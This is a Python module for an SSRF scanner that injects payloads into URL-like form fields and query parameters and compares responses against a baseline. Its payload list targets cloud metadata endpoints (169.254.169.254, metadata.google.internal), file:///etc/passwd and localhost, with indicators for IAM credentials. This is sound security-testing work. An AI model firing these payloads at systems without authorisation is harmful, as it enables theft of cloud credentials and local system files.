"""
SSRF (Server-Side Request Forgery) Scanner
Evidence-based detection with baseline differential analysis
"""

from typing import List, Dict, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
import re


class SSRFScanner:
    """Scanner for SSRF vulnerabilities with strict evidence verification."""
    
    def __init__(self, config, session):
        """Initialize SSRF scanner."""
        self.config = config
        self.session = session
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[Dict[str, Any]]:
        """Load safe, non-destructive SSRF verification payloads."""
        return [
            # Cloud metadata endpoints (safe, read-only metadata probes)
            {
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'type': 'aws-metadata',
                'description': 'AWS EC2 Instance Metadata',
                'indicators': [r'ami-id', r'instance-id', r'iam/security-credentials', r'public-ipv4', r'local-ipv4', r'reservation-id']
            },
            {
                'payload': 'http://metadata.google.internal/computeMetadata/v1/',
                'type': 'gcp-metadata',
                'description': 'GCP Compute Engine Metadata',
                'indicators': [r'instance/id', r'instance/name', r'project/project-id', r'computeMetadata']
            },
            # Protocol handlers (safe local file access)
            {
                'payload': 'file:///etc/passwd',
                'type': 'file-protocol',
                'description': 'Local Unix /etc/passwd file',
                'indicators': [r'root:[^:]*:[0-9]+:[0-9]+:[^:]*:', r'bin/(?:bash|sh|false|nologin)']
            },
            {
                'payload': 'file:///c:/windows/win.ini',
                'type': 'file-protocol',
                'description': 'Local Windows win.ini file',
                'indicators': [r'\[(?:fonts|extensions|mci extensions|files)\]']
            },
            # Local loopback / Internal network probes
            {
                'payload': 'http://127.0.0.1:80/',
                'type': 'localhost',
                'description': 'Localhost Loopback HTTP Service',
                'indicators': [r'internal-service-token', r'redis_version', r'elasticsearch']
            },
        ]
    
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan for SSRF vulnerabilities only on discovered real forms and parameters."""
        vulnerabilities = []
        
        # Scan real HTML forms
        for form in recon_data.get('forms', []):
            form_vulns = await self._scan_form(target, form)
            vulnerabilities.extend(form_vulns)
        
        # Scan real URL parameters discovered on target
        inputs = recon_data.get('inputs', [])
        seen_params = set()
        for param in inputs:
            if param.get('type') == 'url_param':
                p_name = param.get('name', '').strip()
                p_url = param.get('url', target)
                if not p_name or (p_url, p_name) in seen_params:
                    continue
                seen_params.add((p_url, p_name))
                param_vulns = await self._scan_url_param(p_url, param)
                vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    async def _scan_form(self, base_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan form for SSRF with baseline differential comparison."""
        vulnerabilities = []
        
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        form_url = urljoin(base_url, action) if action else base_url
        
        # Look for URL-related input fields
        for input_field in form.get('inputs', []):
            input_name = input_field.get('name', '')
            if not input_name:
                continue
                
            input_name_lower = input_name.lower()
            url_indicators = ['url', 'link', 'uri', 'redirect', 'fetch', 'download', 'proxy', 'image_url', 'img_url', 'webhook', 'feed', 'callback', 'target_url']
            if not any(indicator == input_name_lower or f"_{indicator}" in input_name_lower or f"{indicator}_" in input_name_lower for indicator in url_indicators):
                continue
            
            # Fetch baseline response for form
            baseline_data = {}
            for inp in form.get('inputs', []):
                inp_name = inp.get('name')
                if inp_name:
                    baseline_data[inp_name] = inp.get('value', 'https://example.com/baseline_check')
            
            baseline_content, baseline_status = await self._send_form_request(form_url, method, baseline_data)
            if baseline_content is None:
                continue

            for payload_info in self.payloads:
                payload = payload_info['payload']
                
                test_data = dict(baseline_data)
                test_data[input_name] = payload
                
                test_content, test_status = await self._send_form_request(form_url, method, test_data)
                if test_content is None:
                    continue
                
                finding = self._evaluate_ssrf(
                    url=form_url,
                    method=method,
                    param_name=input_name,
                    payload_info=payload_info,
                    baseline_content=baseline_content,
                    baseline_status=baseline_status,
                    test_content=test_content,
                    test_status=test_status,
                )
                if finding:
                    vulnerabilities.append(finding)
                    break
        
        return vulnerabilities
    
    async def _scan_url_param(self, url: str, param: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan real URL parameter for SSRF using baseline differential comparison."""
        vulnerabilities = []
        param_name = param.get('name', '')
        if not param_name:
            return vulnerabilities
            
        param_name_lower = param_name.lower()
        url_indicators = ['url', 'link', 'uri', 'redirect', 'fetch', 'download', 'proxy', 'image_url', 'img_url', 'webhook', 'feed', 'callback', 'target_url']
        if not any(indicator == param_name_lower or f"_{indicator}" in param_name_lower or f"{indicator}_" in param_name_lower for indicator in url_indicators):
            return vulnerabilities
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param_name not in params:
            params[param_name] = [param.get('value', '')]
        
        # 1. Fetch baseline response with benign target
        baseline_params = {k: list(v) for k, v in params.items()}
        baseline_params[param_name] = ['https://example.com/orion_baseline_test']
        baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(baseline_params, doseq=True)}"
        
        baseline_content, baseline_status = await self._fetch_url(baseline_url)
        if baseline_content is None:
            return vulnerabilities
        
        # 2. Test SSRF payloads
        for payload_info in self.payloads:
            payload = payload_info['payload']
            test_params = {k: list(v) for k, v in params.items()}
            test_params[param_name] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            test_content, test_status = await self._fetch_url(test_url)
            if test_content is None:
                continue
            
            finding = self._evaluate_ssrf(
                url=test_url,
                method='GET',
                param_name=param_name,
                payload_info=payload_info,
                baseline_content=baseline_content,
                baseline_status=baseline_status,
                test_content=test_content,
                test_status=test_status,
            )
            if finding:
                vulnerabilities.append(finding)
                break
        
        return vulnerabilities

    def _evaluate_ssrf(
        self,
        url: str,
        method: str,
        param_name: str,
        payload_info: Dict[str, Any],
        baseline_content: str,
        baseline_status: int,
        test_content: str,
        test_status: int,
    ) -> Optional[Dict[str, Any]]:
        """Evaluate whether SSRF evidence is genuine, differential, and verified."""
        # Rule: If response is completely unchanged from baseline, parameter was ignored or had no outbound effect
        if test_content == baseline_content and test_status == baseline_status:
            return None
        
        payload = payload_info['payload']
        payload_type = payload_info['type']
        indicators = payload_info.get('indicators', [])
        
        # Check for signature indicators present in test response that were NOT in baseline
        matched_indicators = []
        for pattern in indicators:
            if re.search(pattern, test_content, re.IGNORECASE) and not re.search(pattern, baseline_content, re.IGNORECASE):
                matched_indicators.append(pattern)
        
        if matched_indicators:
            # Confirmed SSRF: specific internal resource data was returned by server
            evidence_snippet = self._extract_evidence_snippet(test_content, matched_indicators[0])
            evidence_text = (
                f"Endpoint: {url}\n"
                f"Method: {method}\n"
                f"Parameter: {param_name}\n"
                f"Payload: {payload}\n"
                f"Status: HTTP {test_status}\n"
                f"Matched Signature: {', '.join(matched_indicators)}\n"
                f"Response Evidence: {evidence_snippet}\n"
                f"Detection Reason: Target fetched and returned internal resource data ({payload_info['description']})"
            )
            return {
                'type': 'ssrf',
                'severity': 'high',
                'confidence': 'Confirmed',
                'verification_status': 'confirmed',
                'url': url,
                'affected_url': url,
                'method': method,
                'parameter': param_name,
                'affected_parameter': param_name,
                'payload': payload,
                'ssrf_type': payload_type,
                'title': f'SSRF in parameter "{param_name}"',
                'description': f'Server-Side Request Forgery vulnerability confirmed in parameter "{param_name}". The server retrieved and rendered internal data from {payload}.',
                'evidence': evidence_text,
                'detection_reason': f'Server fetched and returned internal resource data for payload {payload}',
                'remediation': 'Implement a strict allowlist of permitted destination domains and protocols (disable file://, dict://, gopher://). Block outbound requests to link-local (169.254.0.0/16) and private RFC 1918 ranges.',
                'cwe': 'CWE-918',
                'owasp': 'A10:2021 - Server-Side Request Forgery',
            }
        
        # Check for explicit server-side network error messages indicating an attempted backend fetch
        network_error_patterns = [
            r'failed to connect to 127\.0\.0\.1',
            r'failed to connect to 169\.254\.169\.254',
            r'connection refused.*(?:127\.0\.0\.1|169\.254|localhost)',
            r'cURL error 7: Failed to connect',
            r'getaddrinfo failed.*(?:internal|metadata)',
            r'Network is unreachable.*(?:169\.254)',
        ]
        for ep in network_error_patterns:
            if re.search(ep, test_content, re.IGNORECASE) and not re.search(ep, baseline_content, re.IGNORECASE):
                evidence_snippet = self._extract_evidence_snippet(test_content, ep)
                evidence_text = (
                    f"Endpoint: {url}\n"
                    f"Method: {method}\n"
                    f"Parameter: {param_name}\n"
                    f"Payload: {payload}\n"
                    f"Status: HTTP {test_status}\n"
                    f"Server Connection Error: {evidence_snippet}\n"
                    f"Detection Reason: Server attempted outbound connection to internal IP and disclosed connection error"
                )
                return {
                    'type': 'ssrf',
                    'severity': 'medium',
                    'confidence': 'Medium',
                    'verification_status': 'potential',
                    'url': url,
                    'affected_url': url,
                    'method': method,
                    'parameter': param_name,
                    'affected_parameter': param_name,
                    'payload': payload,
                    'ssrf_type': payload_type,
                    'title': f'Potential SSRF in parameter "{param_name}"',
                    'description': f'Potential Server-Side Request Forgery in parameter "{param_name}". The server attempted an outbound network connection to the supplied target.',
                    'evidence': evidence_text,
                    'detection_reason': f'Server disclosed backend network error when attempting connection to {payload}',
                    'remediation': 'Implement URL validation allowlists and disable server-side fetching of arbitrary user-supplied endpoints.',
                    'cwe': 'CWE-918',
                    'owasp': 'A10:2021 - Server-Side Request Forgery',
                }
        
        return None

    def _extract_evidence_snippet(self, content: str, pattern: str, max_length: int = 200) -> str:
        """Extract a readable snippet around the matched evidence."""
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 30)
            end = min(len(content), match.end() + 70)
            return content[start:end].strip().replace('\n', ' ')
        return content[:max_length].strip().replace('\n', ' ')

    async def _send_form_request(self, url: str, method: str, data: Dict[str, Any]) -> tuple[Optional[str], int]:
        try:
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=8) as response:
                    return await response.text(errors="ignore"), response.status
            else:
                async with self.session.get(url, params=data, timeout=8) as response:
                    return await response.text(errors="ignore"), response.status
        except Exception:
            return None, 0

    async def _fetch_url(self, url: str) -> tuple[Optional[str], int]:
        try:
            async with self.session.get(url, timeout=8) as response:
                return await response.text(errors="ignore"), response.status
        except Exception:
            return None, 0
